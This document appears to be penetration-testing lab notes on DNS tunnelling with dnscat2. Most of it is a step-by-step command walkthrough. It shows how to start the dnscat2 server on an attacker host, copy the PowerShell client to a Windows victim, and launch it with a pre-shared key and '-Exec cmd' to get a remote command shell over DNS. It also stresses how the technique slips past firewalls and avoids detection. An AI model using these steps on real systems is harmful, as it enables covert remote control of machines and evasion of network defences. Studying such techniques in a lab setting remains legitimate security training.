
# 1. Concept

DNS tunneling is a technique where data is transmitted inside DNS traffic.

Normal DNS:

```
Client → DNS query → resolve domain → IP
```

With dnscat2:

```
Client → DNS query → carries data → attacker
```

Key idea:

- Uses DNS (port 53), which is usually allowed through firewalls
    
- Encapsulates command-and-control (C2) traffic inside DNS TXT records
    
- Provides encrypted communication channel
    

---

# 2. Architecture

```
[Attack Host] (dnscat2 server)
        ↑↓  DNS (UDP 53)
[Victim Machine] (dnscat2 client)
```

---

# 3. Attack Flow

```
1. Start dnscat2 server on attacker
2. Server generates secret key
3. Transfer dnscat2 client to victim
4. Run client on victim
5. Victim sends DNS queries to attacker
6. Encrypted tunnel established
7. Attacker interacts with shell
```

# 4. Setup — Attack Host

## Where

Kali / attacker machine

---

## Step 1 — Clone repository

```bash
git clone https://github.com/iagox86/dnscat2.git
cd dnscat2/server/
```

---

## Step 2 — Install dependencies

```bash
sudo gem install bundler
sudo bundle install
```

---

## Step 3 — Start server

```bash
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

---

## Meaning of parameters

|Parameter|Purpose|
|---|---|
|host|attacker IP|
|port|DNS port (53)|
|domain|fake domain used for tunneling|
|--no-cache|prevents DNS caching|

---

## Output (important)

Server provides:

```
--secret=<key>
```

This is the pre-shared key used for encryption.

---

# 5. Setup — Client (Windows Target)

## Where

Victim machine (Windows)

---

## Step 4 — Clone client (attacker)

```bash
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

---

## Step 5 — Transfer to victim

### Using SCP

```bash
scp dnscat2-powershell/dnscat2.ps1 username@target_ip:/path/on/target/
```

Example:

```bash
scp dnscat2.ps1 ubuntu@10.129.x.x:/home/ubuntu/
```

---

## Step 6 — Import module (PowerShell)

```powershell
Import-Module .\dnscat2.ps1
```

---

## Step 7 — Start client

```powershell
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret <key> -Exec cmd
```

---

## Meaning of parameters

|Parameter|Purpose|
|---|---|
|-DNSserver|attacker IP|
|-Domain|fake domain|
|-PreSharedSecret|encryption key|
|-Exec cmd|spawn command shell|

---

# 11. Key Points

- Uses DNS (port 53)
    
- Works when HTTP/HTTPS blocked
    
- Encrypted communication using pre-shared key
    
- Difficult to detect compared to normal reverse shells
